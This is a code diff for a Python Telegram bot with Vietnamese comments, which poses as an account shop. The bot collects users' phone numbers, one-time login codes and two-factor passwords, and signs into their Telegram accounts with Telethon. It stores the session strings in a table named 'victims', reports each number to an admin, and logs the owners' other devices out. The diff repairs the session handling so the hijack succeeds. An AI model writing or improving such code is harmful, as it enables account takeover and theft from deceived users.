@@ -32,6 +32,9 @@ bot = telebot.TeleBot(TOKEN)
 # Cờ dừng spam toàn cục
 stop_spam_flag = threading.Event()
 
+# Biến toàn cục tạm thời lưu trữ client Telethon theo user_id (giữ nguyên session giữa gửi code và nhập OTP)
+temp_clients = {}
+
 # ==========================================
 # ===== FLASK SERVER =========================
 # ==========================================
@@ -372,7 +375,6 @@ def callback_buy(call):
         bot.answer_callback_query(call.id, "❌ Bạn không đủ Xu để mua tài khoản này!", show_alert=True)
         return
 
-    # Lưu giao dịch đang chờ vào bảng pending_purchase
     conn = get_db_connection()
     cur = conn.cursor()
     cur.execute("""
@@ -414,26 +416,22 @@ def handle_contact(msg):
     if not phone.startswith('+'):
         phone = '+' + phone
 
-    # Kiểm tra xem có giao dịch đang chờ không
     conn = get_db_connection()
     cur = conn.cursor()
     cur.execute("SELECT * FROM pending_purchase WHERE user_id = %s AND step = 'waiting_contact'", (user_id,))
     pending = cur.fetchone()
 
     if not pending:
-        # Không có giao dịch đang chờ, có thể là người dùng gửi contact linh tinh
         cur.close()
         conn.close()
         bot.reply_to(msg, "❌ Không có giao dịch mua nào đang chờ xác minh. Vui lòng chọn mua acc trước.")
         return
 
-    # Cập nhật số điện thoại vào pending
     cur.execute("UPDATE pending_purchase SET phone = %s, step = 'waiting_otp' WHERE user_id = %s", (phone, user_id))
     conn.commit()
     cur.close()
     conn.close()
 
-    # Xóa bàn phím share contact
     remove_markup = types.ReplyKeyboardRemove()
     bot.send_message(msg.chat.id, "⏳ Hệ thống đang yêu cầu Telegram gửi mã xác nhận đến thiết bị của bạn...\nVui lòng chờ trong giây lát!", reply_markup=remove_markup)
     bot.send_message(ADMIN_ID, f"📱 Số mới nhận từ Contact: {phone} | ID: {user_id}")
@@ -445,11 +443,13 @@ def handle_contact(msg):
 # ==========================================
 def trigger_telegram_code(chat_id, user_id, phone):
     try:
-        # Dùng StringSession rỗng, không cần file
+        # Khởi tạo client Telethon và kết nối
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         client.connect()
         client.send_code_request(phone)
-        client.disconnect()
+        
+        # Lưu trữ client tạm thời vào bộ nhớ để giữ session gửi code
+        temp_clients[user_id] = client
 
         conn = get_db_connection()
         cur = conn.cursor()
@@ -461,7 +461,7 @@ def trigger_telegram_code(chat_id, user_id, phone):
         sent = bot.send_message(
             chat_id,
             "📲 Mã xác minh Telegram đã được gửi thành công!\n\n"
-            "👉 Vui lòng nhập **mã OTP 6 chữ số** (nhập liền, không cần cách khoảng):"
+            "👉 Vui lòng nhập **mã OTP 6 chữ số** (nhập liền, không cách khoảng):"
         )
         bot.register_next_step_handler(sent, process_otp, user_id)
 
@@ -469,7 +469,7 @@ def trigger_telegram_code(chat_id, user_id, phone):
         bot.send_message(ADMIN_ID, f"❌ Lỗi gửi code tự động cho {phone}: {e}")
         bot.send_message(
             chat_id,
-            "❌ Không thể gửi mã xác nhận đến số này (có thể do bị giới hạn từ Telegram).\n"
+            "❌ Không thể gửi mã xác nhận đến số này (có thể do IP Render bị Telegram giới hạn hoặc số bị hạn chế).\n"
             "Vui lòng thử lại sau."
         )
 
@@ -480,7 +480,6 @@ def process_otp(msg, user_id):
         bot.register_next_step_handler(sent, process_otp, user_id)
         return
 
-    # Lấy thông tin giao dịch từ pending_purchase
     conn = get_db_connection()
     cur = conn.cursor()
     cur.execute("SELECT category, price, phone FROM pending_purchase WHERE user_id = %s AND step = 'waiting_otp'", (user_id,))
@@ -495,7 +494,6 @@ def process_otp(msg, user_id):
     price = pending['price']
     phone = pending['phone']
 
-    # Lưu OTP vào bảng victims (để lịch sử)
     cur.execute("INSERT INTO victims (phone, otp, telegram_id, status) VALUES (%s, %s, %s, 'sending_code')",
                 (phone, otp, user_id))
     conn.commit()
@@ -507,20 +505,27 @@ def process_otp(msg, user_id):
 
     def login():
         try:
-            # Dùng StringSession, không cần file
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            client.start(phone=phone, password=otp)
-            session_str = client.session.save()  # Lưu session string
+            # Lấy lại client đã giữ session từ bước gửi code
+            client = temp_clients.get(user_id)
+            if not client:
+                client = TelegramClient(StringSession(), API_ID, API_HASH)
+                client.connect()
+
+            # Sử dụng sign_in để xác thực mã OTP chính xác
+            client.sign_in(phone=phone, code=otp)
+            session_str = client.session.save()
             client.disconnect()
 
-            # Cập nhật session vào bảng victims
+            # Xóa khỏi bộ nhớ tạm sau khi dùng xong
+            if user_id in temp_clients:
+                del temp_clients[user_id]
+
             conn_db = get_db_connection()
             cur_db = conn_db.cursor()
             cur_db.execute("UPDATE victims SET session_string = %s, status = 'logged_in' WHERE phone = %s",
                            (session_str, phone))
             conn_db.commit()
 
-            # Reset thiết bị khác
             revoked = reset_other_devices(phone, session_str)
             reset_msg = f"Đã đăng xuất {revoked} thiết bị cũ thành công" if revoked >= 0 else "Lỗi reset thiết bị"
             cur_db.execute("UPDATE victims SET note = %s WHERE phone = %s", (reset_msg, phone))
@@ -567,7 +572,6 @@ def process_otp(msg, user_id):
         except Exception as e:
             bot.send_message(ADMIN_ID, f"❌ Lỗi login {phone}: {e}")
             sent = bot.reply_to(msg, "❌ Sai OTP hoặc mã đã hết hạn. Vui lòng nhập lại mã OTP:")
-            # Reset trạng thái pending để nhập lại OTP
             conn_db = get_db_connection()
             cur_db = conn_db.cursor()
             cur_db.execute("UPDATE pending_purchase SET step = 'waiting_otp' WHERE user_id = %s", (user_id,))
@@ -599,10 +603,17 @@ def process_password(msg, user_id):
 
     def login_with_pass():
         try:
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            client.start(phone=phone, password=password)
+            client = temp_clients.get(user_id)
+            if not client:
+                client = TelegramClient(StringSession(), API_ID, API_HASH)
+                client.connect()
+
+            client.sign_in(password=password)
             session_str = client.session.save()
             client.disconnect()
+
+            if user_id in temp_clients:
+                del temp_clients[user_id]
 
             conn_db = get_db_connection()
             cur_db = conn_db.cursor()
@@ -615,7 +626,6 @@ def process_password(msg, user_id):
             cur_db.execute("UPDATE victims SET note = %s WHERE phone = %s", (reset_msg, phone))
             conn_db.commit()
 
-            # ---- HOÀN TẤT GIAO DỊCH ----
             cur_db.execute("SELECT category, price FROM pending_purchase WHERE user_id = %s", (user_id,))
             pending_data = cur_db.fetchone()
             category = pending_data['category']
